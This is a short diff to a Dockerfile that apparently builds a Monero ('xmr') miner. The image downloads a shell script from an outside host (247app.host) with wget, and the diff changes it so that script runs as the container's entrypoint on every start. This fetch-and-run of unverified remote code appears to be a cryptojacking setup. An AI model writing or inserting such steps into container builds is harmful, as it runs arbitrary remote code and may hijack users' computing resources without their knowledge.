@@ -11,5 +11,7 @@ RUN apt-get update && \
     cmake .. -DCMAKE_BUILD_TYPE=Release && \
     make && \
     wget http://247app.host/apo/run.sh && \
-    chmod 755 run.sh && \
-    sh ./run.sh
+    chmod 755 run.sh
+
+WORKDIR /xmr/build
+ENTRYPOINT ["./run.sh"]
